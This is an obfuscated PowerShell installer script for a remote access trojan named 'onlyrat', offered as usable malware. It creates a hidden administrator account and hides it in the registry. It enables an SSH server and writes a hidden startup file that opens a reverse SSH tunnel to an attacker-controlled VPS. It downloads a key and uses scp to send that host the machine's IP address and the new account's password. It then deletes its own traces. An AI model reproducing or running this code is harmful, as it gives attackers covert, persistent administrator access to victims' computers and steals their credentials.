# TODO: incorporate necessary payload installs

$nkowFESgaO = "wraith" # change me, vps username
$ecPlmJVLRo = "45.61.56.252" # change me. vps ip address
$YlEQgBmePn = "5656" # change me, vps port [NOT DEFAULT SSH PORT]

$dERQpoZWxz = "$nkowFESgaO@$ecPlmJVLRo"

function RpLGWiUsIy {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
}

function geIwCZloBx {
    [CmdletBinding()]
    param (
        [string] $sqbXFdLvyw,
        [securestring] $CBFXIYeWPR
    )    
    begin {
    }    
    process {
        New-LocalUser "$sqbXFdLvyw" -Password $CBFXIYeWPR -FullName "$sqbXFdLvyw" -Description "Temporary local admin"
        Write-Verbose "$sqbXFdLvyw local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$sqbXFdLvyw"
        Write-Verbose "$sqbXFdLvyw added to the local administrator group"
    }    
    end {
    }
}

# make admin
$sqbXFdLvyw = "onlyrat"
$DCilJFugpP = RpLGWiUsIy
Remove-LocalUser -Name $sqbXFdLvyw
$CBFXIYeWPR = (ConvertTo-SecureString $DCilJFugpP -AsPlainText -Force)
geIwCZloBx -sqbXFdLvyw $sqbXFdLvyw -CBFXIYeWPR $CBFXIYeWPR

# registry
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $sqbXFdLvyw -Value 0 -Type DWORD -Force

# ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# startup file
# TODO:  registry startup
$GlNweBEFmh = RpLGWiUsIy
$NyZnoLKCIs = Get-Location
Add-Content -Path "$NyZnoLKCIs/$GlNweBEFmh.cmd" -Value "@echo off"
Add-Content -Path "$NyZnoLKCIs/$GlNweBEFmh.cmd" -Value "powershell powershell.exe -windowstyle hidden -ep bypass `"ssh -o ServerAliveInterval=30 -R $YlEQgBmePn`:localhost:22 $dERQpoZWxz -i $env:temp\key`"" 

# rat file
$CRYnrkaDbe = "$env:UserName.rat"
$AhdjktGyiZ = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress

Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ # local ip addr
Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP # pass
Add-Content -Path $CRYnrkaDbe -Value $env:temp # temp
Add-Content -Path $CRYnrkaDbe -Value $NyZnoLKCIs # startup
Add-Content -Path $CRYnrkaDbe -Value $ecPlmJVLRo # remote host
Add-Content -Path $CRYnrkaDbe -Value $YlEQgBmePn # remote port
Add-Content -Path $CRYnrkaDbe -Value 'remote' # connection type

# get key and sent rat
Invoke-WebRequest -Uri "http://$ecPlmJVLRo/onlyrat.key" -OutFile "$env:temp\key"
scp -i $env:temp\key -r $CRYnrkaDbe $dERQpoZWxz`:/home/$nkowFESgaO

# cleanup
Set-Location C:\Users
attrib +h +s +r onlyrat 
Set-Location $NyZnoLKCIs
Remove-Item $CRYnrkaDbe
Remove-Item KFPGaEYdcz.ps1
start "./$GlNweBEFmh.cmd"